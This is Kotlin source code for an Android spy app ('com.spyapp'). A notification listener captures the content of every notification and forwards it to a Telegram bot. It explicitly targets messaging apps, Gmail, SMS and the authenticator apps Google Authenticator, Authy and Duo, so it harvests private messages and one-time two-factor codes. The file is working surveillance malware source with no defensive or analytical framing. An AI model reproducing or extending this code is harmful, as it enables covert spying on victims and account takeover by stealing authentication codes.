package com.spyapp

import android.app.Notification
import android.content.Context
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.text.TextUtils
import java.text.SimpleDateFormat
import java.util.*

class NotificationListener : NotificationListenerService() {

    companion object {
        // قائمة التطبيقات المهمة للمراقبة
        private val TARGET_PACKAGES = mapOf(
            "com.whatsapp"                    to "واتساب",
            "com.whatsapp.w4b"                to "واتساب بيزنس",
            "com.facebook.orca"               to "ماسنجر",
            "com.facebook.katana"             to "فيسبوك",
            "com.instagram.android"           to "إنستغرام",
            "com.snapchat.android"            to "سناب شات",
            "com.twitter.android"             to "تويتر",
            "org.telegram.messenger"          to "تيليغرام",
            "com.google.android.gm"           to "Gmail",
            "com.google.android.apps.messaging" to "Messages",
            "com.android.mms"                 to "الرسائل (نظام)",
            "com.android.settings"            to "الإعدادات",
            "com.google.android.apps.authenticator2" to "Google Auth",
            "com.authy.authy"                 to "Authy",
            "com.duosecurity.duomobile"       to "Duo Mobile",
        )
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        try {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""

            // تجاهل الإشعارات الفارغة
            if (title.isEmpty() && text.isEmpty() && subText.isEmpty()) return

            // استخراج اسم التطبيق
            val appName = TARGET_PACKAGES[packageName] ?: getAppLabel(packageName)

            val sb = StringBuilder()
            sb.appendLine("╔══════════════════════════╗")
            sb.appendLine("║      🔔 إشعار جديد       ║")
            sb.appendLine("╚══════════════════════════╝")
            sb.appendLine()
            sb.appendLine("📦 *التطبيق:* $appName")
            sb.appendLine("🆔 *الحزمة:* `$packageName`")

            if (title.isNotEmpty()) {
                sb.appendLine("📌 *العنوان:* $title")
            }
            if (subText.isNotEmpty()) {
                sb.appendLine("📎 *عنوان فرعي:* $subText")
            }
            if (text.isNotEmpty()) {
                sb.appendLine("💬 *المحتوى:* $text")
            }

            // استخراج معلومات إضافية
            extractLines(extras)?.let { lines ->
                if (lines.isNotEmpty()) {
                    sb.appendLine("📋 *تفاصيل إضافية:*")
                    lines.forEach { line ->
                        sb.appendLine("    • $line")
                    }
                }
            }

            sb.appendLine()
            sb.appendLine("🕐 _${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}_")

            TelegramBot.send(this, sb.toString())

        } catch (e: Exception) {
            TelegramBot.sendError(this, "NotificationListener", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // غير ضروري حالياً
    }

    private fun extractLines(extras: Bundle): List<String>? {
        try {
            val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
            return lines?.map { it.toString() }?.filter { it.isNotBlank() }
        } catch (e: Exception) {
            return null
        }
    }

    private fun getAppLabel(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName.substringAfterLast(".")
        }
    }
}
